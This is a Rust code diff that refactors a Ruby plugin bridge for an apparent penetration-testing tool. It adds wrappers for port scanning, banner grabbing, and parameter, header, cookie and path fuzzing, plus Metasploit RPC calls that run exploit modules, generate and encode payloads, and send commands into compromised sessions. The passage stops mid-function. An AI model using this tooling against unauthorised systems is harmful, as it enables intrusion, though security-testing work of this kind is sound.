@@ -1,8 +1,5 @@
 #[cfg(feature = "ruby-plugins")]
-use magnus::{class::Class, module::Module, prelude::*, value::ReprValue, Error, Ruby};
-
-#[cfg(feature = "ruby-plugins")]
-use base64::Engine as _;
+use magnus::{prelude::*, Error, Ruby};
 
 #[cfg(feature = "ruby-plugins")]
 fn get_runtime() -> &'static tokio::runtime::Runtime {
@@ -11,9 +8,8 @@ fn get_runtime() -> &'static tokio::runtime::Runtime {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn runtime_error(msg: impl Into<std::string::String>) -> Error {
-    let ruby = Ruby::get().unwrap();
-    Error::new(ruby.class_runtime_error(), msg)
+fn runtime_error(ruby: &Ruby, msg: impl Into<std::borrow::Cow<'static, str>>) -> Error {
+    Error::new(ruby.exception_runtime_error(), msg)
 }
 
 #[cfg(feature = "ruby-plugins")]
@@ -86,77 +82,77 @@ fn http_get(ruby: &Ruby, url: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let response = rt
         .block_on(async { reqwest::get(&url).await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
     let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn http_post(url: String, body: String) -> Result<magnus::RHash, Error> {
+fn http_post(ruby: &Ruby, url: String, body: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
         .block_on(async { client.post(&url).body(body).send().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
-    let hash = Ruby::get().unwrap().hash_new();
+    let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let response_body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
     hash.aset("body", response_body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn http_put(url: String, body: String) -> Result<magnus::RHash, Error> {
+fn http_put(ruby: &Ruby, url: String, body: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
         .block_on(async { client.put(&url).body(body).send().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
-    let hash = Ruby::get().unwrap().hash_new();
+    let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let response_body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
     hash.aset("body", response_body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn http_delete(url: String) -> Result<magnus::RHash, Error> {
+fn http_delete(ruby: &Ruby, url: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let response = rt
         .block_on(async { client.delete(&url).send().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
-    let hash = Ruby::get().unwrap().hash_new();
+    let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
+fn http_request(ruby: &Ruby, method: String, url: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
@@ -168,32 +164,32 @@ fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
         "HEAD" => client.head(&url),
         "OPTIONS" => client.request(reqwest::Method::OPTIONS, &url),
         "PATCH" => client.patch(&url),
-        _ => return Err(runtime_error(format!("Unknown HTTP method: {}", method))),
+        _ => return Err(runtime_error(ruby, format!("Unknown HTTP method: {}", method))),
     };
 
     let response = rt
         .block_on(async { request.send().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
-    let hash = Ruby::get().unwrap().hash_new();
+    let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn tcp_connect(host: String, port: u16) -> Result<bool, Error> {
+fn tcp_connect(ruby: &Ruby, host: String, port: u16) -> Result<bool, Error> {
     use std::net::ToSocketAddrs;
 
     let addr = format!("{}:{}", host, port)
         .to_socket_addrs()
-        .map_err(|e| runtime_error(e.to_string()))?
+        .map_err(|e| runtime_error(ruby, e.to_string()))?
         .next()
-        .ok_or_else(|| runtime_error("Failed to resolve host"))?;
+        .ok_or_else(|| runtime_error(ruby, "Failed to resolve host"))?;
 
     let rt = get_runtime();
     let connected = rt
@@ -210,16 +206,16 @@ fn tcp_connect(host: String, port: u16) -> Result<bool, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn scan_port(host: String, port: u16) -> Result<bool, Error> {
-    tcp_connect(host, port)
+fn scan_port(ruby: &Ruby, host: String, port: u16) -> Result<bool, Error> {
+    tcp_connect(ruby, host, port)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn grab_banner(host: String, port: u16) -> Result<String, Error> {
+fn grab_banner(ruby: &Ruby, host: String, port: u16) -> Result<String, Error> {
     let rt = get_runtime();
 
     let banner = rt.block_on(async {
-        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        use tokio::io::AsyncReadExt;
 
         let addr = format!("{}:{}", host, port);
         let mut stream = tokio::time::timeout(
@@ -227,14 +223,14 @@ fn grab_banner(host: String, port: u16) -> Result<String, Error> {
             tokio::net::TcpStream::connect(&addr),
         )
         .await
-        .map_err(|e| runtime_error(e.to_string()))?
-        .map_err(|e| runtime_error(e.to_string()))?;
+        .map_err(|e| runtime_error(ruby, e.to_string()))?
+        .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
         let mut buffer = vec![0u8; 1024];
         let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buffer))
             .await
-            .map_err(|e| runtime_error(e.to_string()))?
-            .map_err(|e| runtime_error(e.to_string()))?;
+            .map_err(|e| runtime_error(ruby, e.to_string()))?
+            .map_err(|e| runtime_error(ruby, e.to_string()))?;
 
         Ok::<String, Error>(String::from_utf8_lossy(&buffer[..n]).to_string())
     })?;
@@ -244,18 +240,23 @@ fn grab_banner(host: String, port: u16) -> Result<String, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn fuzz_param(
+    ruby: &Ruby,
     url: String,
     param: String,
-    payloads: Vec<String>,
-    options: Vec<String>,
-) -> Result<Vec<magnus::RHash>, Error> {
-    let mut results = Vec::new();
-    let ruby = Ruby::get().unwrap();
+    payloads: magnus::RArray,
+    _options: magnus::RArray,
+) -> Result<magnus::RArray, Error> {
+    let results = ruby.ary_new();
 
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
-    for payload in payloads {
+    let payload_vec: Vec<String> = payloads
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
+        .collect();
+
+    for payload in payload_vec {
         let mut url_with_param = url.clone();
         if url.contains('?') {
             url_with_param.push_str(&format!("&{}={}", param, payload));
@@ -276,9 +277,8 @@ fn fuzz_param(
                 hash.aset("status", status)?;
 
                 let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
+                let is_vulnerable = detect_vulnerability(status, &body);
                 hash.aset("body", body)?;
-
-                let is_vulnerable = detect_vulnerability(&resp, "");
                 hash.aset("vulnerable", is_vulnerable)?;
             }
             Err(e) => {
@@ -290,7 +290,7 @@ fn fuzz_param(
             }
         }
 
-        results.push(hash);
+        results.push(hash)?;
     }
 
     Ok(results)
@@ -298,18 +298,23 @@ fn fuzz_param(
 
 #[cfg(feature = "ruby-plugins")]
 fn fuzz_header(
+    ruby: &Ruby,
     url: String,
     header: String,
-    payloads: Vec<String>,
-    _options: Vec<String>,
-) -> Result<Vec<magnus::RHash>, Error> {
-    let mut results = Vec::new();
-    let ruby = Ruby::get().unwrap();
+    payloads: magnus::RArray,
+    _options: magnus::RArray,
+) -> Result<magnus::RArray, Error> {
+    let results = ruby.ary_new();
 
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
-    for payload in payloads {
+    let payload_vec: Vec<String> = payloads
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
+        .collect();
+
+    for payload in payload_vec {
         let response =
             rt.block_on(async { client.get(&url).header(&header, &payload).send().await });
 
@@ -324,9 +329,8 @@ fn fuzz_header(
                 hash.aset("status", status)?;
 
                 let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
+                let is_vulnerable = detect_vulnerability(status, &body);
                 hash.aset("body", body)?;
-
-                let is_vulnerable = detect_vulnerability(&resp, &body);
                 hash.aset("vulnerable", is_vulnerable)?;
             }
             Err(e) => {
@@ -338,7 +342,7 @@ fn fuzz_header(
             }
         }
 
-        results.push(hash);
+        results.push(hash)?;
     }
 
     Ok(results)
@@ -346,18 +350,23 @@ fn fuzz_header(
 
 #[cfg(feature = "ruby-plugins")]
 fn fuzz_cookie(
+    ruby: &Ruby,
     url: String,
     cookie_name: String,
-    payloads: Vec<String>,
-    _options: Vec<String>,
-) -> Result<Vec<magnus::RHash>, Error> {
-    let mut results = Vec::new();
-    let ruby = Ruby::get().unwrap();
+    payloads: magnus::RArray,
+    _options: magnus::RArray,
+) -> Result<magnus::RArray, Error> {
+    let results = ruby.ary_new();
 
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
-    for payload in payloads {
+    let payload_vec: Vec<String> = payloads
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
+        .collect();
+
+    for payload in payload_vec {
         let cookie = format!("{}={}", cookie_name, payload);
 
         let response =
@@ -373,9 +382,8 @@ fn fuzz_cookie(
                 hash.aset("status", status)?;
 
                 let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
+                let is_vulnerable = detect_vulnerability(status, &body);
                 hash.aset("body", body)?;
-
-                let is_vulnerable = detect_vulnerability(&resp, &body);
                 hash.aset("vulnerable", is_vulnerable)?;
             }
             Err(e) => {
@@ -386,23 +394,27 @@ fn fuzz_cookie(
             }
         }
 
-        results.push(hash);
+        results.push(hash)?;
     }
 
     Ok(results)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn fuzz_path(url: String, paths: Vec<String>) -> Result<Vec<magnus::RHash>, Error> {
-    let mut results = Vec::new();
-    let ruby = Ruby::get().unwrap();
+fn fuzz_path(ruby: &Ruby, url: String, paths: magnus::RArray) -> Result<magnus::RArray, Error> {
+    let results = ruby.ary_new();
 
     let rt = get_runtime();
     let client = reqwest::Client::new();
 
     let base_url = url.trim_end_matches('/');
 
-    for path in paths {
+    let path_vec: Vec<String> = paths
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
+        .collect();
+
+    for path in path_vec {
         let full_url = format!("{}/{}", base_url, path);
 
         let response = rt.block_on(async { client.get(&full_url).send().await });
@@ -428,15 +440,14 @@ fn fuzz_path(url: String, paths: Vec<String>) -> Result<Vec<magnus::RHash>, Erro
             }
         }
 
-        results.push(hash);
+        results.push(hash)?;
     }
 
     Ok(results)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn detect_vulnerability(resp: &reqwest::Response, body: &str) -> bool {
-    let status = resp.status().as_u16();
+fn detect_vulnerability(status: u16, body: &str) -> bool {
     let body_lower = body.to_lowercase();
 
     status == 500
@@ -448,6 +459,7 @@ fn detect_vulnerability(resp: &reqwest::Response, body: &str) -> bool {
 
 #[cfg(feature = "ruby-plugins")]
 fn report_finding(
+    _ruby: &Ruby,
     severity: String,
     finding_type: String,
     description: String,
@@ -464,6 +476,7 @@ fn report_finding(
 
 #[cfg(feature = "ruby-plugins")]
 fn report_vulnerability(
+    _ruby: &Ruby,
     severity: String,
     vuln_type: String,
     description: String,
@@ -480,31 +493,31 @@ fn report_vulnerability(
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn report_info(title: String, message: String) -> Result<(), Error> {
+fn report_info(_ruby: &Ruby, title: String, message: String) -> Result<(), Error> {
     tracing::info!("[{}] {}", title, message);
     Ok(())
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn report_success(title: String, message: String) -> Result<(), Error> {
+fn report_success(_ruby: &Ruby, title: String, message: String) -> Result<(), Error> {
     tracing::info!("[SUCCESS] {}: {}", title, message);
     Ok(())
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn report_warning(title: String, message: String) -> Result<(), Error> {
+fn report_warning(_ruby: &Ruby, title: String, message: String) -> Result<(), Error> {
     tracing::warn!("[WARNING] {}: {}", title, message);
     Ok(())
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn report_error(title: String, message: String) -> Result<(), Error> {
+fn report_error(_ruby: &Ruby, title: String, message: String) -> Result<(), Error> {
     tracing::error!("[ERROR] {}: {}", title, message);
     Ok(())
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn register_metasploit_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
+fn register_metasploit_api(_ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
     let msf = slapper.define_module("Metasploit")?;
 
     msf.define_module_function("connect", magnus::function!(msf_connect, 3))?;
@@ -535,7 +548,7 @@ fn register_metasploit_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(),
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn register_encoder_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
+fn register_encoder_api(_ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
     let encoder = slapper.define_module("Encoder")?;
 
     encoder.define_module_function("list", magnus::function!(encoder_list, 0))?;
@@ -549,7 +562,7 @@ fn register_encoder_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Er
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn register_session_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
+fn register_session_api(_ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
     let session = slapper.define_module("Session")?;
 
     session.define_module_function("list", magnus::function!(session_list, 0))?;
@@ -575,7 +588,7 @@ fn get_msf_client() -> &'static tokio::sync::Mutex<Option<MsfClientState>> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_connect(url: String, username: String, password: String) -> Result<bool, Error> {
+fn msf_connect(_ruby: &Ruby, url: String, username: String, password: String) -> Result<bool, Error> {
     let rt = get_runtime();
 
     let config = crate::msf::MsfConfig {
@@ -601,12 +614,12 @@ fn msf_connect(url: String, username: String, password: String) -> Result<bool, 
             });
             Ok(true)
         }
-        Err(e) => Err(runtime_error(e.to_string())),
+        Err(e) => Err(runtime_error(_ruby, e.to_string())),
     }
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_connect_with_token(url: String, token: String) -> Result<bool, Error> {
+fn msf_connect_with_token(_ruby: &Ruby, url: String, token: String) -> Result<bool, Error> {
     let rt = get_runtime();
 
     let config = crate::msf::MsfConfig {
@@ -630,7 +643,7 @@ fn msf_connect_with_token(url: String, token: String) -> Result<bool, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_connected() -> Result<bool, Error> {
+fn msf_connected(_ruby: &Ruby) -> Result<bool, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
@@ -639,7 +652,7 @@ fn msf_connected() -> Result<bool, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_disconnect() -> Result<bool, Error> {
+fn msf_disconnect(_ruby: &Ruby) -> Result<bool, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let mut guard = get_msf_client().lock().await;
@@ -649,23 +662,23 @@ fn msf_disconnect() -> Result<bool, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_version() -> Result<String, Error> {
+fn msf_version(_ruby: &Ruby) -> Result<String, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
             match state.client.get_version().await {
                 Ok(v) => Ok(format!("{} (Ruby: {})", v.version, v.ruby)),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
+fn msf_list_modules(_ruby: &Ruby, module_type: String) -> Result<Vec<String>, Error> {
     let msf_type = match module_type.to_lowercase().as_str() {
         "exploit" => crate::msf::ModuleType::Exploit,
         "auxiliary" => crate::msf::ModuleType::Auxiliary,
@@ -673,7 +686,7 @@ fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
         "payload" => crate::msf::ModuleType::Payload,
         "encoder" => crate::msf::ModuleType::Encoder,
         "nop" => crate::msf::ModuleType::Nop,
-        _ => return Err(runtime_error("Invalid module type")),
+        _ => return Err(runtime_error(_ruby, "Invalid module type")),
     };
 
     let rt = get_runtime();
@@ -682,16 +695,16 @@ fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
         if let Some(ref state) = *guard {
             match state.client.list_modules(msf_type).await {
                 Ok(modules) => Ok(modules),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::RHash, Error> {
+fn msf_module_info(ruby: &Ruby, module_type: String, module_name: String) -> Result<magnus::RHash, Error> {
     let msf_type = match module_type.to_lowercase().as_str() {
         "exploit" => crate::msf::ModuleType::Exploit,
         "auxiliary" => crate::msf::ModuleType::Auxiliary,
@@ -699,10 +712,9 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
         "payload" => crate::msf::ModuleType::Payload,
         "encoder" => crate::msf::ModuleType::Encoder,
         "nop" => crate::msf::ModuleType::Nop,
-        _ => return Err(runtime_error("Invalid module type")),
+        _ => return Err(runtime_error(ruby, "Invalid module type")),
     };
 
-    let ruby = Ruby::get().unwrap();
     let hash = ruby.hash_new();
 
     let rt = get_runtime();
@@ -712,15 +724,16 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
             match state.client.get_module_info(msf_type, &module_name).await {
                 Ok(info) => {
                     let _ = hash.aset("name", info.name);
-                    let _ = hash.aset("module_type", info.module_type);
+                    let _ = hash.aset("fullname", info.fullname);
                     let _ = hash.aset("description", info.description);
-                    let _ = hash.aset("references", info.references.join(", "));
+                    let refs_flat: Vec<String> = info.references.into_iter().flatten().collect();
+                    let _ = hash.aset("references", refs_flat.join(", "));
                     Ok(())
                 }
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(ruby, "Not connected to Metasploit"))
         }
     })?;
 
@@ -729,22 +742,23 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
 
 #[cfg(feature = "ruby-plugins")]
 fn msf_execute_module(
+    ruby: &Ruby,
     module_type: String,
     module_name: String,
-    options: Vec<String>,
+    options: magnus::RArray,
 ) -> Result<magnus::RHash, Error> {
     let msf_type = match module_type.to_lowercase().as_str() {
         "exploit" => crate::msf::ModuleType::Exploit,
         "auxiliary" => crate::msf::ModuleType::Auxiliary,
         "post" => crate::msf::ModuleType::Post,
-        _ => return Err(runtime_error("Invalid module type")),
+        _ => return Err(runtime_error(ruby, "Invalid module type")),
     };
 
-    let ruby = Ruby::get().unwrap();
     let hash = ruby.hash_new();
 
     let opts: std::collections::HashMap<String, String> = options
-        .iter()
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
         .filter_map(|s| {
             let parts: Vec<&str> = s.splitn(2, '=').collect();
             if parts.len() == 2 {
@@ -770,10 +784,10 @@ fn msf_execute_module(
                     let _ = hash.aset("uuid", result.uuid);
                     Ok(())
                 }
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(ruby, "Not connected to Metasploit"))
         }
     })?;
 
@@ -781,9 +795,10 @@ fn msf_execute_module(
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_generate_payload(payload_name: String, options: Vec<String>) -> Result<String, Error> {
+fn msf_generate_payload(_ruby: &Ruby, payload_name: String, options: magnus::RArray) -> Result<String, Error> {
     let opts: std::collections::HashMap<String, String> = options
-        .iter()
+        .into_iter()
+        .filter_map(|v| String::try_convert(v).ok())
         .filter_map(|s| {
             let parts: Vec<&str> = s.splitn(2, '=').collect();
             if parts.len() == 2 {
@@ -803,18 +818,17 @@ fn msf_generate_payload(payload_name: String, options: Vec<String>) -> Result<St
                     &base64::engine::general_purpose::STANDARD,
                     &bytes,
                 )),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
-    let ruby = Ruby::get().unwrap();
-    let mut results = Vec::new();
+fn msf_list_sessions(ruby: &Ruby) -> Result<magnus::RArray, Error> {
+    let results = ruby.ary_new();
 
     let rt = get_runtime();
     rt.block_on(async {
@@ -825,7 +839,7 @@ fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
                     for (id, session) in sessions {
                         let hash = ruby.hash_new();
                         let _ = hash.aset("id", id);
-                        let _ = hash.aset("type", session.session_type);
+                        let _ = hash.aset("type", session.session_type.to_string());
                         let _ = hash.aset("exploit", session.exploit_name);
                         let _ = hash.aset("target", session.target_host);
                         let _ = hash.aset("info", session.info);
@@ -833,14 +847,14 @@ fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
                         let _ = hash.aset("via_payload", session.via_payload);
                         let _ = hash.aset("via_exploit", session.via_exploit);
                         let _ = hash.aset("created_at", session.created_at);
-                        results.push(hash);
+                        results.push(hash)?;
                     }
                     Ok(())
                 }
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(ruby, "Not connected to Metasploit"))
         }
     })?;
 
@@ -848,8 +862,7 @@ fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
-    let ruby = Ruby::get().unwrap();
+fn msf_session_info(ruby: &Ruby, session_id: String) -> Result<magnus::RHash, Error> {
     let hash = ruby.hash_new();
 
     let rt = get_runtime();
@@ -859,7 +872,7 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
             match state.client.get_session(&session_id).await {
                 Ok(session) => {
                     let _ = hash.aset("id", session_id);
-                    let _ = hash.aset("type", session.session_type);
+                    let _ = hash.aset("type", session.session_type.to_string());
                     let _ = hash.aset("exploit", session.exploit_name);
                     let _ = hash.aset("target", session.target_host);
                     let _ = hash.aset("info", session.info);
@@ -869,10 +882,10 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
                     let _ = hash.aset("created_at", session.created_at);
                     Ok(())
                 }
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(ruby, "Not connected to Metasploit"))
         }
     })?;
 
@@ -880,7 +893,7 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_session_write(session_id: String, command: String) -> Result<String, Error> {
+fn msf_session_write(_ruby: &Ruby, session_id: String, command: String) -> Result<String, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
@@ -891,76 +904,76 @@ fn msf_session_write(session_id: String, command: String) -> Result<String, Erro
                 .await
             {
                 Ok(output) => Ok(output),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_session_read(session_id: String) -> Result<String, Error> {
+fn msf_session_read(_ruby: &Ruby, session_id: String) -> Result<String, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
             match state.client.read_session_output(&session_id).await {
                 Ok(output) => Ok(output),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn msf_session_stop(session_id: String) -> Result<bool, Error> {
+fn msf_session_stop(_ruby: &Ruby, session_id: String) -> Result<bool, Error> {
     let rt = get_runtime();
     rt.block_on(async {
         let guard = get_msf_client().lock().await;
         if let Some(ref state) = *guard {
             match state.client.kill_session(&session_id).await {
                 Ok(()) => Ok(true),
-                Err(e) => Err(runtime_error(e.to_string())),
+                Err(e) => Err(runtime_error(_ruby, e.to_string())),
             }
         } else {
-            Err(runtime_error("Not connected to Metasploit"))
+            Err(runtime_error(_ruby, "Not connected to Metasploit"))
         }
     })
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn encoder_list() -> Result<Vec<String>, Error> {
-    msf_list_modules("encoder".to_string())
+fn encoder_list(ruby: &Ruby) -> Result<Vec<String>, Error> {
+    msf_list_modules(ruby, "encoder".to_string())
 }
 
 #[cfg(feature = "ruby-plugins")]
 fn encoder_encode(
+    ruby: &Ruby,
     payload: String,
     encoder_name: String,
-    mut options: Vec<String>,
+    options: magnus::RArray,
 ) -> Result<String, Error> {
     // Add payload to options
-    options.push(format!("PAYLOAD={}", payload));
+    options.push(ruby.str_new(&format!("PAYLOAD={}", payload)))?;
     
     // Delegate to msf_execute_module with encoder type
-    let result = msf_execute_module("encoder".to_string(), encoder_name, options)?;
+    let result = msf_execute_module(ruby, "encoder".to_string(), encoder_name, options)?;
     
     // Extract the encoded payload from the result
-    let encoded = result
-        .lookup("encoded_payload")
+    let encoded: String = result
+        .lookup::<_, magnus::Value>("encoded_payload")
         .ok()
-        .flatten()
-        .and_then(|v| v.try_convert().ok())
+        .and_then(|v| String::try_convert(v).ok())
         .unwrap_or_default();
     
     Ok(encoded)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn encoder_compatible_payloads(encoder_name: String) -> Result<Vec<String>, Error> {
+fn encoder_compatible_payloads(_ruby: &Ruby, encoder_name: String) -> Result<Vec<String>, Error> {
     // This would require querying the Metasploit database for compatible payloads
     // For now, return an empty list with a note that this feature is not fully implemented
     tracing::warn!(
@@ -971,41 +984,41 @@ fn encoder_compatible_payloads(encoder_name: String) -> Result<Vec<String>, Erro
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn session_list() -> Result<Vec<magnus::RHash>, Error> {
-    msf_list_sessions()
+fn session_list(ruby: &Ruby) -> Result<magnus::RArray, Error> {
+    msf_list_sessions(ruby)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn session_interact(session_id: String) -> Result<bool, Error> {
+fn session_interact(_ruby: &Ruby, session_id: String) -> Result<bool, Error> {
     tracing::info!("Interacting with session {}", session_id);
     Ok(true)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn session_write(session_id: String, command: String) -> Result<String, Error> {
-    msf_session_write(session_id, command)
+fn session_write(ruby: &Ruby, session_id: String, command: String) -> Result<String, Error> {
+    msf_session_write(ruby, session_id, command)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn session_read_output(session_id: String) -> Result<String, Error> {
-    msf_session_read(session_id)
+fn session_read_output(ruby: &Ruby, session_id: String) -> Result<String, Error> {
+    msf_session_read(ruby, session_id)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn session_shell_upgrade(session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
+fn session_shell_upgrade(ruby: &Ruby, session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
     // Validate lhost as a valid IP or hostname
     if lhost.is_empty() || lhost.contains(|c: char| !c.is_alphanumeric() && c != '.' && c != '-' && c != ':') {
-        return Err(runtime_error("Invalid lhost: must be a valid IP address or hostname"));
+        return Err(runtime_error(ruby, "Invalid lhost: must be a valid IP address or hostname"));
     }
     // Validate lport as a valid u16
